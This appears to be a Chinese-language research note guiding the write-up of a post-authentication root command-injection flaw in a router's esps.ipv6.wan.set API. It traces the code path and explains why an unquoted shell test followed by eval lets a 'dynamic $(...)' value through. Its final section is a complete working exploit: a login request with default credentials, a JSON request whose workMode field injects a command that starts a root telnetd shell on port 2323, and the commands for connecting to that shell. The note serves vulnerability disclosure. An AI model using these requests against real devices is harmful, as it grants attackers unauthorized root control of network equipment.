# `esps.ipv6.wan.set` `workMode` Root RCE 分析指导与正式稿修改建议

## 1. 用途

这份文档配套：

- `report/postauth_esps_ipv6_wan_workmode_rce_report.md`

目的是把 `workMode` 注入为什么能过校验、为什么最终能执行，写得更严谨。

## 2. 一句话结论

真实链路是：

```text
/api/esps
  -> magic_link 直接转发到 esps.ipv6.wan.set
  -> workMode 先进入未加引号的 [ ${param_workMode} != "dynamic" ]
  -> 再进入 eval set_workmode${idx}="${param_workMode}"
  -> 构造 "dynamic $(...)" 可通过预期分支并执行命令
```

这里的重点不是简单“有 eval”，而是“未加引号的判断 + eval”双重问题。

## 3. 关键静态证据

### 3.1 `/api/esps` 到 ubus 的通用转发

可直接复用这几处证据：

- `/www/api` `FCGI_EspsProcess`
  - `0x405078` 读 body
  - `0x4050dc` 组装 `lua /usr/lib/lua/protol_cvt.lua magic_link '<body>'`
  - `0x405424` `popen`
- `/usr/lib/lua/protol_cvt.lua`
  - `25-27`, `50-56`, `77`, `89`, `117`
- `/usr/lib/lua/magic_link/magic_link.lua`
  - `12-25`

### 3.2 危险点在 `workMode` 的校验与保存

`/usr/libexec/rpcd/esps.ipv6.wan`：

- `269`：`json_get_var param_workMode workMode`
- `271-275`：

```sh
if [ ${param_workMode} != "dynamic" ];then
    result=9730
    return_json ${result}
    return
fi
```

- `277`：

```sh
eval set_workmode${idx}="${param_workMode}"
```

### 3.3 为什么 `dynamic $(...)` 能工作

PoC 使用：

```text
dynamic $(echo ... >/tmp/...; telnetd ...)
```

如果命令替换本身不向 stdout 输出内容，那么未加引号判断在展开后仍会留下：

```text
[ dynamic != "dynamic" ]
```

于是逻辑继续往下执行，而命令替换副作用已经发生。随后同一值又进入 `eval`，风险进一步放大。

## 4. 正式稿建议补强点

### 4.1 写清 payload 为何能绕过预期枚举

不要只写：

- shell command substitution in `workMode`

还要写：

- payload keeps the leading token `dynamic`
- command substitution emits no stdout
- the unquoted shell test therefore still behaves as if the value were `dynamic`

### 4.2 明确这是 IPv6 WAN 配置入口

这条链操作的是：

- `esps.ipv6.wan`
- `set`
- `list[0].workMode`

建议把这一层结构写清，便于审稿人复现。

## 5. 建议补充的验证内容

1. 登录获取 session；
2. 调用 `esps.ipv6.wan.set`；
3. 连接临时 `telnetd` 证明 root；
4. 可再调用 `esps.ipv6.wan.get` 与 `status` 做回读。

## 6. 建议结论写法

> The vulnerable parameter is not only passed to `eval`; it is first used in an unquoted shell comparison, which allows a payload of the form `dynamic $(...)` to preserve the expected control-flow decision while executing attacker-controlled commands as root.

## 7. BurpSuite 逐步复现

约定：

- 目标：`192.168.8.1`
- 默认账号：`admin / admin123`
- 临时 shell 端口：`2323`

### 7.1 包 1：登录获取 session

```http
POST /api/login/auth HTTP/1.1
Host: 192.168.8.1
User-Agent: Mozilla/5.0
Accept: application/json, text/plain, */*
Content-Type: application/json
Connection: close

{"username":"admin","password":"admin123"}
```

从响应里取：

- `data.session`

后续所有 `/api/esps` 包都写：

- `AUTHENTICATION: <SESSION>`

### 7.2 包 2：触发 `esps.ipv6.wan.set`

这条 payload 的关键是：

- 前缀保留 `dynamic `
- 命令替换不输出 stdout

```http
POST /api/esps HTTP/1.1
Host: 192.168.8.1
User-Agent: Mozilla/5.0
Accept: application/json, text/plain, */*
Content-Type: application/json
AUTHENTICATION: <SESSION>
Connection: close

[{"id":1,"object":"esps.ipv6.wan","method":"set","param":{"list":[{"intf":"WAN1","workMode":"dynamic $(echo IPV6WAN_RCE_OK >/tmp/ipv6wan_rce_marker; /usr/sbin/telnetd -p 2323 -l /bin/sh >/dev/null 2>&1 &)"}]}}]
```

### 7.3 第 3 步：连接 shell 验证 root

等 1-2 秒后：

```bash
telnet 192.168.8.1 2323
```

或：

```bash
nc 192.168.8.1 2323
```

执行：

```sh
id
uname -a
cat /tmp/ipv6wan_rce_marker
```

预期看到：

```text
uid=0(root)
IPV6WAN_RCE_OK
```

### 7.4 包 3：可选，回读 IPv6 WAN 状态

```http
POST /api/esps HTTP/1.1
Host: 192.168.8.1
User-Agent: Mozilla/5.0
Accept: application/json, text/plain, */*
Content-Type: application/json
AUTHENTICATION: <SESSION>
Connection: close

[{"id":1,"object":"esps.ipv6.wan","method":"get","param":{"list":["WAN1"]}}]
```

```http
POST /api/esps HTTP/1.1
Host: 192.168.8.1
User-Agent: Mozilla/5.0
Accept: application/json, text/plain, */*
Content-Type: application/json
AUTHENTICATION: <SESSION>
Connection: close

[{"id":1,"object":"esps.ipv6.wan","method":"status","param":{"list":["WAN1"]}}]
```

### 7.5 清理 shell

在拿到的 shell 中执行：

```sh
ps w | grep 'telnetd -p 2323'
kill <PID>
```
